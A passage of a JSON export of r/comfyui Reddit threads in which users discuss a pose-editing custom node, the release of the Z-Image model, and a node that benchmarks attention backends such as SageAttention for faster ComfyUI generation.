              ]
            },
            {
              "id": "o26vqzq",
              "author": "crowzor",
              "text": "get the same issue",
              "score": 1,
              "created_utc": "2026-01-28 10:26:56",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o26skt2",
          "author": "alborden",
          "text": "Can this work with z-image turbo?",
          "score": 1,
          "created_utc": "2026-01-28 09:58:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o26sozp",
              "author": "AHEKOT",
              "text": "Can work with any model that support controlnet or have edit function. For better results use openpose + depthmap",
              "score": 3,
              "created_utc": "2026-01-28 09:59:31",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o27d7mt",
                  "author": "verticalfuzz",
                  "text": "As in... instead of this? In addition to? Could you elaborate?",
                  "score": 1,
                  "created_utc": "2026-01-28 12:41:20",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o26u13w",
          "author": "crowzor",
          "text": "looks great but the node seems to be broken at the moment",
          "score": 1,
          "created_utc": "2026-01-28 10:11:35",
          "is_submitter": false,
          "replies": [
            {
              "id": "o26u7u0",
              "author": "AHEKOT",
              "text": "What's not working for you? It would be helpful for me!",
              "score": 1,
              "created_utc": "2026-01-28 10:13:17",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o271dkq",
                  "author": "crowzor",
                  "text": "https://preview.redd.it/h8n60wryp2gg1.png?width=266&format=png&auto=webp&s=2932fbc4f3ba95cae1692b3a4fdba30e98fd9f4c\n\nthe window keeps expanding down",
                  "score": 1,
                  "created_utc": "2026-01-28 11:14:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o26w720",
          "author": "Nokai77",
          "text": "I haven't tried it, but it would be great if it worked with ZImage. Also, it would be really useful to be able to save poses and then load them. Good job, I've installed it but I need to restart to see if it works.",
          "score": 1,
          "created_utc": "2026-01-28 10:30:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o26wzc2",
              "author": "AHEKOT",
              "text": "1. It should, but you will need controlnet.  \n2. it have! Save it, export, import, share with others!",
              "score": 3,
              "created_utc": "2026-01-28 10:37:48",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o26yw6v",
          "author": "crowzor",
          "text": "The window just keeps extending down. Will send a screengrab soon",
          "score": 1,
          "created_utc": "2026-01-28 10:54:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o26zhrn",
          "author": "Upset-Virus9034",
          "text": "Can someone share a workflow and guidance to work it properly?üôè",
          "score": 1,
          "created_utc": "2026-01-28 10:59:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o26zofx",
              "author": "AHEKOT",
              "text": "https://preview.redd.it/s45so05en2gg1.png?width=893&format=png&auto=webp&s=0944c5def996435db217e512d2be3e965df9de37\n\nIt right on GitHub Readme)  \nOr you can open it in Templates tab inside ComfyUI itself",
              "score": 2,
              "created_utc": "2026-01-28 11:00:48",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o270svv",
                  "author": "Upset-Virus9034",
                  "text": "Thanks üôè",
                  "score": 1,
                  "created_utc": "2026-01-28 11:10:13",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o279efy",
          "author": "pepitogrillo221",
          "text": "The transfer pose are very good but the output quality its very PLASTIC EFFECT. Why? Any way to improve this?",
          "score": 1,
          "created_utc": "2026-01-28 12:15:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "o279opi",
              "author": "AHEKOT",
              "text": "Try this mode first \n\nhttps://preview.redd.it/6tazdmw013gg1.png?width=416&format=png&auto=webp&s=a090a8116935ee9c459dde9a02b12f6c8feb6b38\n\nQWEN not very good at lights. It this will help - then need to do more training with realistic pictures.",
              "score": 1,
              "created_utc": "2026-01-28 12:17:32",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o29ntfa",
                  "author": "pepitogrillo221",
                  "text": "I were doing with it and no way, same plastic, im using Q6 gguf with my 3090.",
                  "score": 1,
                  "created_utc": "2026-01-28 19:07:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o279m1s",
          "author": "shamomylle",
          "text": "This looks amazing, thanks for sharing, can't wait to try it out <3",
          "score": 1,
          "created_utc": "2026-01-28 12:17:02",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o27py50",
          "author": "Pleasant-Money5481",
          "text": "C'est possible d'utiliser VNCCS avec sdxl ?",
          "score": 1,
          "created_utc": "2026-01-28 13:54:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o27qdu9",
          "author": "bickid",
          "text": "Thx for this. I'm note an expert with comfyui, so let me ask: I have the nodes now. Even could open them in a new workflow to test whether they appear or not. But if I use Qwen Image Edit, how do I integrate these nodes into a Qwen Image Edit-workflow? thx",
          "score": 1,
          "created_utc": "2026-01-28 13:56:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o27rfrd",
              "author": "AHEKOT",
              "text": "Check example workflow in github readme!",
              "score": 1,
              "created_utc": "2026-01-28 14:01:53",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o28gpkq",
          "author": "Nevaditew",
          "text": "https://preview.redd.it/dqanxa5354gg1.png?width=842&format=png&auto=webp&s=782a2d9714f63790f52ea12adc1f1186a8b328d5\n\nI tested it and it replicates the pose very accurately, but the quality(Colors, style) degrades.  \nIt's adding strokes to the contours when it shouldn't, and the colors are a bit off. The original hand looks slightly pink, but it's turning out whiter in the output.  -keep original lighting is on- btw",
          "score": 1,
          "created_utc": "2026-01-28 16:01:26",
          "is_submitter": false,
          "replies": [
            {
              "id": "o29euc1",
              "author": "AHEKOT",
              "text": "Need to improve lora. I think there is way to do this, but it take so long at 5070ti. When it would be done i make a new post with new version)",
              "score": 3,
              "created_utc": "2026-01-28 18:28:49",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o28pbmm",
          "author": "VirtualWishX",
          "text": "Looks really cool, thank you! ‚ù§Ô∏è  \nI installed everything, I also downloaded for the QWEN Loader: q**wen-image-edit-2511-Q8\\_0.gguf** because I'm still a newbie and I don't know how to use the none-GGUF there (I'm with **RTX 5090**),  \nI had to put it on the UNET so the node will allow me to pick it up.\n\nI loaded the image on the loader and run, but it ignores the image this is what I get is the actual 3D MODEL and sometimes I get the ACTUAL image I loaded but with PLASTIC SKIN.\n\n1Ô∏è‚É£ - ~~Can you please share a~~ **~~None-Unet~~** ~~folder / model~~ **~~Workflow~~** ~~so I can try improve quality on RTX 5090~~  \n~~I don't want to break the workflow, and I'm a noob,~~  \nEDIT:  \nIt seems like I just used a different Loader for the Model without ruin anything after all...\n\nUnfortunately I sitll get mostly Plastic smooth AI look skin results, even with different Qwen edit models I tried (none Q or GGUF), I tried 8 steps but it looks even worst.\n\n2Ô∏è‚É£ - I loaded Solid Grey Color but it's not rendering that Background (ignoring it) - How to render with Selected ANY Background (not just solid color) instead of the default background ?\n\n3Ô∏è‚É£ - It's simple to ROTATE but how do I MOVE around the HAND / NECK / LEG etc.. ?\n\nI hope you can help, thanks ahead! üôè\n\nI attached an example (image from [**Pexels** (download here) üëà](https://www.pexels.com/photo/woman-in-studio-on-white-background-6311497/):  \nI always get PLASTIC skin while in normal Qwen (non Q8 usually I get very realistic results in other workflows).\n\nhttps://preview.redd.it/tdb3ry7sb4gg1.jpeg?width=3785&format=pjpg&auto=webp&s=9c449b78b3da8138ac951b24561a21a70a9e8cf2",
          "score": 1,
          "created_utc": "2026-01-28 16:38:38",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2a9nie",
              "author": "[deleted]",
              "text": "[deleted]",
              "score": 2,
              "created_utc": "2026-01-28 20:44:48",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o2ahcmw",
                  "author": "VirtualWishX",
                  "text": "Thanks I will give it a try.  \n  \n**EDIT:**  \nI tried you suggestions, I get AMAZING results even on 4 steps on any other workflow with same config Euler / simple (also Euler A / Beta works but less nice) all the other attempts are even MORE plastic look so, I believe it's some other process in the workflow is not forgiving by strength that is maybe higher or overwrite because no matter how hard I try in the specific workflow with the POSE (which is awesome) I get plastic looks.\n\nMaybe the pose editor and anything it uses on the progress behind the hood just make things more plasticky or 3D look instead of photorealistic, and no prompt can save this as well.",
                  "score": 1,
                  "created_utc": "2026-01-28 21:18:28",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o28sfwi",
          "author": "wbiggs205",
          "text": "When I try to install missing node I getting this error \n\n\\[Installation Errors\\] 'VNCCS - Collection of utility nodes': With the current security level configuration, only custom nodes from the **\"default channel\"** can be installed.",
          "score": 1,
          "created_utc": "2026-01-28 16:52:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o291fgn",
          "author": "NoWrongdoer7363",
          "text": "https://preview.redd.it/bdirfve8l4gg1.jpeg?width=720&format=pjpg&auto=webp&s=6e58a383ebf4b88437ca07d6b72ce0329097785a\n\nÿÆŸÑÿπ ÿßŸÑŸÖŸÑÿßÿ®ÿ≥",
          "score": 1,
          "created_utc": "2026-01-28 17:31:28",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qohto8",
      "title": "Z-Image is out!",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qohto8/zimage_is_out/",
      "author": "Dry-Heart-9295",
      "created_utc": "2026-01-27 16:00:51",
      "score": 191,
      "num_comments": 45,
      "upvote_ratio": 0.98,
      "text": "[https://huggingface.co/Tongyi-MAI/Z-Image](https://huggingface.co/Tongyi-MAI/Z-Image)",
      "is_original_content": false,
      "link_flair_text": "News",
      "permalink": "https://reddit.com/r/comfyui/comments/1qohto8/zimage_is_out/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o21hvto",
          "author": "Mendoozaaaaaaaaaaaa",
          "text": "the edging has finished",
          "score": 42,
          "created_utc": "2026-01-27 16:29:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "o21j7q1",
              "author": "Charming_Mousse_2981",
              "text": "Not yet, still edging until the edit model drops.\n\n![gif](giphy|H6cmWzp6LGFvqjidB7)",
              "score": 40,
              "created_utc": "2026-01-27 16:35:10",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o221sew",
                  "author": "That-Captain-7859",
                  "text": "Same. Here's hoping that comes out soon. Thankfully even ZIT is strong enough to understand basic consistency through clever prompting, maybe the base model even more so.",
                  "score": 2,
                  "created_utc": "2026-01-27 17:55:22",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o2833u5",
                  "author": "NewOrDare",
                  "text": "Agree",
                  "score": 1,
                  "created_utc": "2026-01-28 15:00:14",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o227zdb",
          "author": "Kinsiinoo",
          "text": "GGUFs are already out on HF by jayn7!",
          "score": 8,
          "created_utc": "2026-01-27 18:21:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o224ylx",
          "author": "unsuspectedSadist",
          "text": "turn down the cfg for Image to image",
          "score": 8,
          "created_utc": "2026-01-27 18:08:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o22bjon",
          "author": "sbalani",
          "text": "If anyone uses runpod I've got it setup on my template [https://console.runpod.io/deploy?template=p61ub3cnmv&ref=49tc28ho](https://console.runpod.io/deploy?template=p61ub3cnmv&ref=49tc28ho)\n\nif you go to environment variables and scroll to the bottom you'll see Z-Image Turbo. Set it from 0 to 1, deploy and it will automatically download all the required models and custom nodes while you grab a coffee.\n\nI'm just setting up my pod to play with it :D\n\nYou're welcome",
          "score": 8,
          "created_utc": "2026-01-27 18:36:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o22ytb0",
          "author": "King_Salomon",
          "text": "is this z image and not z image turbo? is that the difference?",
          "score": 5,
          "created_utc": "2026-01-27 20:18:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "o24h3dm",
              "author": "Hogesyx",
              "text": "Seems to be the full weight.",
              "score": 3,
              "created_utc": "2026-01-28 00:36:49",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o2bk0tc",
                  "author": "King_Salomon",
                  "text": "cool. tnx!",
                  "score": 1,
                  "created_utc": "2026-01-29 00:24:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o21e9c1",
          "author": "mongini12",
          "text": "Can somebody explain to me how to use split model files in comfyui? 00001-of-00002 - both files in the same folder and just use the 00001 and comfy will do the rest? Or do I need a certain node?",
          "score": 8,
          "created_utc": "2026-01-27 16:13:36",
          "is_submitter": false,
          "replies": [
            {
              "id": "o21gadr",
              "author": "ZorakTheMantis123",
              "text": "download the safetensors file from comfy-org's huggingface page",
              "score": 28,
              "created_utc": "2026-01-27 16:22:26",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o21w31d",
                  "author": "mongini12",
                  "text": "![gif](giphy|5xtDarmwsuR9sDRObyU)",
                  "score": 13,
                  "created_utc": "2026-01-27 17:30:42",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o21wsoz",
                  "author": "That-Captain-7859",
                  "text": "Currently downloading!!!",
                  "score": 3,
                  "created_utc": "2026-01-27 17:33:53",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o21c24c",
          "author": "ritikvirus",
          "text": "Let's see hype or real",
          "score": 3,
          "created_utc": "2026-01-27 16:04:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o25nogr",
          "author": "Bill_Mariachi",
          "text": "What‚Äôs special about this? How is this different than the z-image I‚Äôve been using?",
          "score": 5,
          "created_utc": "2026-01-28 04:28:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o21bjg1",
          "author": "LadenBennie",
          "text": "BOOM!",
          "score": 3,
          "created_utc": "2026-01-27 16:01:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o21mfjz",
          "author": "stash0606",
          "text": "so what does this mean for LoRa training? Has ai-toolkit been updated yet?",
          "score": 3,
          "created_utc": "2026-01-27 16:48:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o21yqyc",
              "author": "Minimum-Let5766",
              "text": "Author says yes. See [https://github.com/ostris/ai-toolkit/commits/main/](https://github.com/ostris/ai-toolkit/commits/main/)  for update history",
              "score": 8,
              "created_utc": "2026-01-27 17:42:23",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o21ztlk",
                  "author": "stash0606",
                  "text": "ah cheers, thanks.",
                  "score": 1,
                  "created_utc": "2026-01-27 17:47:03",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o2650cu",
          "author": "cloutier85",
          "text": "I thought Z-Image was out already.. what does this mean?",
          "score": 3,
          "created_utc": "2026-01-28 06:30:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o21h7qu",
          "author": "machinesarenotpeople",
          "text": "What is the peak VRAM usage?",
          "score": 4,
          "created_utc": "2026-01-27 16:26:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o22yc5z",
              "author": "tooSAVERAGE",
              "text": "Yes.",
              "score": 15,
              "created_utc": "2026-01-27 20:16:35",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o21qtyf",
          "author": "Minimum-Let5766",
          "text": "I am actually on the verge of being out of HDD space.  Making room for new model...",
          "score": 2,
          "created_utc": "2026-01-27 17:07:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o21wlnj",
              "author": "mongini12",
              "text": "HDD? Damn... starting the first generation must take forever",
              "score": 8,
              "created_utc": "2026-01-27 17:32:59",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o24nitz",
              "author": "DigThatData",
              "text": "delete old models you don't use anymore and/or move to an external drive. log the names of the models somewhere in case you want to download them again later. it's fun having a rich \"palette\" of models to choose from, but let's be real: how many different checkpoints have you used on more than two occasions in the past month?",
              "score": 2,
              "created_utc": "2026-01-28 01:09:50",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o2227wt",
          "author": "Black_Otter",
          "text": "![gif](giphy|kC2cRqEt8o41COgjoV|downsized)",
          "score": 2,
          "created_utc": "2026-01-27 17:57:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o21k0zm",
          "author": "Sarashana",
          "text": "I am going to miss the \"soon!!!!!\" threads...",
          "score": 2,
          "created_utc": "2026-01-27 16:38:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o22azv4",
              "author": "PANTONE_17-1230",
              "text": "I'm sure Wan2.5 will keep you happy.",
              "score": 7,
              "created_utc": "2026-01-27 18:34:27",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o22trsp",
          "author": "TekaiGuy",
          "text": "Comfy repackaged model: [https://huggingface.co/Comfy-Org/z\\_image/tree/main/split\\_files/diffusion\\_models](https://huggingface.co/Comfy-Org/z_image/tree/main/split_files/diffusion_models)\n\nOnly 12Gb wow. Can't wait to try it out and see if we can train loras on it with kohya. I just started learning it and would hate if I had to learn a completely different trainer because it wasn't supported.",
          "score": 1,
          "created_utc": "2026-01-27 19:55:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o23dzkz",
              "author": "Symbiot78",
              "text": "link for download doesn't work. Maybe too many hits atm.",
              "score": 0,
              "created_utc": "2026-01-27 21:26:41",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o23fjzt",
          "author": "EpicNoiseFix",
          "text": "What is the hardware specs to run this",
          "score": 1,
          "created_utc": "2026-01-27 21:33:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o24i4w7",
          "author": "tethered_together",
          "text": "New to all this.. what type of images is Z-image focused on?",
          "score": 1,
          "created_utc": "2026-01-28 00:42:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o27937q",
          "author": "BeatnologicalMNE",
          "text": "Anyone else having a problem where z-image model simply produces gibberish? Using same old workflows with turbo version works just fine.",
          "score": 1,
          "created_utc": "2026-01-28 12:13:23",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2a0w3m",
          "author": "mlaurindo30",
          "text": "I can't get this model to work; it just keeps showing a black screen as the final output.",
          "score": 1,
          "created_utc": "2026-01-28 20:05:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o22nrxj",
          "author": "HighGaiN",
          "text": "Will this work with 16GB vram? I can see model is about 20GB",
          "score": 1,
          "created_utc": "2026-01-27 19:29:20",
          "is_submitter": false,
          "replies": [
            {
              "id": "o22t7v3",
              "author": "MysteriousMongoose92",
              "text": "The [bf16 version](https://huggingface.co/Comfy-Org/z_image/tree/main/split_files/diffusion_models) is 12.3gb so yes",
              "score": 2,
              "created_utc": "2026-01-27 19:53:35",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o263me5",
                  "author": "ang_mo_uncle",
                  "text": "It does, even on a 6800xt (albeit slow BC BF16 needs to be upcast to FP32 which then doesn't fit into VRAM. Will need to downcast to fp16...)",
                  "score": 1,
                  "created_utc": "2026-01-28 06:19:45",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o227qml",
          "author": "[deleted]",
          "text": "[deleted]",
          "score": 0,
          "created_utc": "2026-01-27 18:20:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o22p8xg",
              "author": "TheBestPractice",
              "text": "Is this bait? Base is going to be less detailed, if anything",
              "score": 3,
              "created_utc": "2026-01-27 19:35:57",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o23bsyj",
                  "author": "Keem773",
                  "text": "Yep, you are 100% correct about that. ",
                  "score": 1,
                  "created_utc": "2026-01-27 21:17:10",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qnmten",
      "title": "Did you know one simple change can make ComfyUI generations up to 3x faster? But I need your help :) Auto-benchmark attention backends.",
      "subreddit": "comfyui",
      "url": "https://i.redd.it/rzkcxlam9qfg1.png",
      "author": "D_Ogi",
      "created_utc": "2026-01-26 17:36:47",
      "score": 174,
      "num_comments": 65,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Help Needed",
      "permalink": "https://reddit.com/r/comfyui/comments/1qnmten/did_you_know_one_simple_change_can_make_comfyui/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o1vgfbv",
          "author": "OnceWasPerfect",
          "text": "Couple questions if you don't mind:\n\n1.  Should i take out my --sage-attention flag from my bat?  \n2.  If i use multiple models and multiple ksamplers in a workflow, say initially making a gen with klein and then doing a refinement pass with zimage how does this node affect that, can the attention mechanisms be changed on the fly like that or is it one attention per run?  If it can be changed on the fly do I put one of these nodes in front of each ksampler?   \n3.  Is there any added time for the first one while its collecting the data? \n\nThanks!",
          "score": 27,
          "created_utc": "2026-01-26 19:13:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1x3a8s",
              "author": "Icy_Concentrate9182",
              "text": "The flag is no longer needed unless you need to force it in some edge case",
              "score": 7,
              "created_utc": "2026-01-26 23:42:01",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1vunwt",
              "author": "pwillia7",
              "text": "+1 leaving a note to check back for answers I have the same question",
              "score": 4,
              "created_utc": "2026-01-26 20:15:00",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o23wnoq",
              "author": "D_Ogi",
              "text": "All I use is  `--windows-standalone-build`",
              "score": 1,
              "created_utc": "2026-01-27 22:53:14",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o27ueae",
                  "author": "OnceWasPerfect",
                  "text": "Cool, any insight as to what happens when running multiple models in the same workflow?",
                  "score": 1,
                  "created_utc": "2026-01-28 14:17:10",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1vbhd8",
          "author": "D_Ogi",
          "text": "Here‚Äôs what the JSON report looks like after I parse it on my setup: per-backend attention times in ms, with the winner highlighted.\n\nhttps://preview.redd.it/ch6zya9spqfg1.png?width=1063&format=png&auto=webp&s=413d68cbe9ebf15f6daff4006d48d4ebd00e2a2b",
          "score": 9,
          "created_utc": "2026-01-26 18:52:26",
          "is_submitter": true,
          "replies": [
            {
              "id": "o1vi76t",
              "author": "alb5357",
              "text": "Sage is twice as fast as flash attending here. Is that sage 2?",
              "score": 2,
              "created_utc": "2026-01-26 19:20:51",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1vplj4",
                  "author": "D_Ogi",
                  "text": "It's Sage 2 Auto which I assume switched to the \"sage\\_fp8\\_cuda\\_fast\" kernel.",
                  "score": 2,
                  "created_utc": "2026-01-26 19:52:51",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1xpmiw",
              "author": "harderisbetter",
              "text": "noob here, so I can't use your node to speed up my z- image wf, right? Since it's not listed in your repo, and cos the official wf don't have sageattn?",
              "score": 2,
              "created_utc": "2026-01-27 01:38:48",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1y5jcp",
                  "author": "D_Ogi",
                  "text": "Yes, you can. Honestly, I did the above benchmark using z-image turbo.",
                  "score": 3,
                  "created_utc": "2026-01-27 03:05:42",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1v1u30",
          "author": "ChromaBroma",
          "text": "If only I could get sageattn3 to actually work on my pc. But it's cool that your node can benchmark it. I've been wanting to compare sageattn2 vs 3 in terms of quality and speed on my own hardware. Any tips on how to get sageattn3 to work well? Ideally without messing up sageattn2.",
          "score": 7,
          "created_utc": "2026-01-26 18:12:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v3qvh",
              "author": "D_Ogi",
              "text": "Yeah, SageAttn3 has been a bit of a ‚Äúbleeding edge tax‚Äù so far.\n\nSageAttention2 already has multiple kernels/variants, so ‚ÄúSageAttn2‚Äù is not just one thing. Depending on your install and GPU, different SA2 flavors can win.\n\nSageAttention3 is basically Blackwell-only in practice, because it leans on FP4 / Blackwell-specific capabilities. So on an RTX 4090 (Ada) it is expected to not work. I only have a 4090 myself, so I can‚Äôt validate SA3 locally, which is part of why I‚Äôm asking the community to test.",
              "score": 9,
              "created_utc": "2026-01-26 18:20:15",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1w1p9e",
                  "author": "xb1n0ry",
                  "text": "Is SA3 optimized for fp4 only like the new nvfp4 models or does it help with fp8/16 and gguf too? Using a 5090. Will the sage auto even use SA3 or do the nodes have to support SA3 explicitly?",
                  "score": 1,
                  "created_utc": "2026-01-26 20:46:11",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1wb604",
              "author": "VladyCzech",
              "text": "I don‚Äôt think it is wise to use SageAttention 3 giving speed while lowering output quality compared to SA2. SA3 is probably better use in first pass only and then do refine with SA2 or pure model. SA3 has specific use case scenarios.",
              "score": 2,
              "created_utc": "2026-01-26 21:28:16",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1v2fzp",
          "author": "Eshinio",
          "text": "When using this, should I remove/bypass all current nodes in my workflow that enable SageAttention or fp16\\_accumulation and then let your node do its thing?\n\nAlso, if I already use the latest Sageattention by default (having a RTX 3090, so can't use more modern features), is there still any reason to use it?",
          "score": 6,
          "created_utc": "2026-01-26 18:14:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "o22vcy0",
              "author": "FourtyMichaelMichael",
              "text": "That's what I'm wondering. If with a 3090 you just leave --use-sageattention in... If you're going to get the identical result of install this node anyhow.",
              "score": 1,
              "created_utc": "2026-01-27 20:03:00",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1yjvmk",
          "author": "oneFookinLegend",
          "text": "I wasted like one hour with this. Following the instructions broke my comfyui install. I had to learn 10 new things in order to fix it.",
          "score": 5,
          "created_utc": "2026-01-27 04:31:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1zjs7k",
              "author": "D_Ogi",
              "text": "What was the problem? Installation of attention backends usually takes some time.",
              "score": 2,
              "created_utc": "2026-01-27 09:23:00",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1waydg",
          "author": "ANR2ME",
          "text": "Btw, can it be added to support more attentions for GPUs that doesn't support standard FlashAttention2+ ü§î\n\nFor example:\n- flash-attn-triton\n- flash-linear-attention\n- aule-attention",
          "score": 4,
          "created_utc": "2026-01-26 21:27:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wcrxi",
          "author": "YMIR_THE_FROSTY",
          "text": "In case you have 10xx era GPU, you dont need to bother much. There are like two options and odds are you already use fastest. :D\n\nIt starts to become interesting at 30xx era and newer.",
          "score": 3,
          "created_utc": "2026-01-26 21:35:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1v10j8",
          "author": "Busy_Aide7310",
          "text": "How much speed increase can I expect from using that node on Wan 2.2, vs using SageAttention2?",
          "score": 4,
          "created_utc": "2026-01-26 18:08:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v2f99",
              "author": "D_Ogi",
              "text": "If you‚Äôre already running the fastest option on your machine, the speedup from my node is basically 0%. The node doesn‚Äôt ‚Äústack‚Äù extra acceleration on top of SageAttention2, it just chooses the fastest attention implementation available (or the fastest Sage variant) for your GPU + model + seq\\_len.\n\nThe catch is: you usually don‚Äôt know what‚Äôs fastest ahead of time. SageAttention2 itself has multiple variants / kernels (and there are also SageAttention2++ style variants depending on what you installed), and sometimes FlashAttention (2/3) or another backend can win on certain GPUs / shapes.\n\nSo the real answer is: could be 0%, could be noticeable and the whole point of the node is to benchmark your setup once and stop guessing.",
              "score": 16,
              "created_utc": "2026-01-26 18:14:42",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1vwezd",
                  "author": "the_friendly_dildo",
                  "text": "So to be clear, you need all of the different variants installed correctly for this to work right?",
                  "score": 3,
                  "created_utc": "2026-01-26 20:22:46",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1uy31f",
          "author": "an80sPWNstar",
          "text": "I love this idea. When you say it's global, what exactly do you mean? It writes this data to ComfyUI itself to be used for all future renders on that particular model or just workflow? What if your workflow doesn't include the sage attention/torch/triton nodes? Will it still work?",
          "score": 2,
          "created_utc": "2026-01-26 17:56:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v05l5",
              "author": "D_Ogi",
              "text": "Thanks! By ‚Äúglobal‚Äù I mean it applies at runtime to the current ComfyUI session (the Python process), not just a single node branch. Once the Attention Optimizer node executes, the selected attention backend is used for the rest of that run and subsequent renders in the same session, regardless of which workflow you run next, until you change it again or restart ComfyUI. The only thing persisted to disk is the benchmark cache (`benchmark_db.json`) so future runs can pick the same winner instantly.\n\nYou also do not need to add any separate SageAttention / Flash / xFormers nodes to the workflow. This node detects what‚Äôs installed, benchmarks only the available backends, and applies the fastest (or your forced choice). If a backend isn‚Äôt installed it‚Äôs skipped during benchmarking, and if you force a backend that‚Äôs not available it falls back to PyTorch SDPA and reports it.",
              "score": 10,
              "created_utc": "2026-01-26 18:05:11",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1v1nyc",
                  "author": "an80sPWNstar",
                  "text": "Holy moly, that's pretty freaking amazing! I'll give it a shot and let you know if I have any questions.",
                  "score": 5,
                  "created_utc": "2026-01-26 18:11:33",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1w19a2",
                  "author": "susne",
                  "text": "I have a 4090 16gb variant with xformers disabled, pytorch cross attention default, and i use sage2 sometimes with the kjnodes patches. I'm guessing i should remove any enabling/disabling for it to function properly?\n\nAre there any models it doesn't work with?",
                  "score": 1,
                  "created_utc": "2026-01-26 20:44:13",
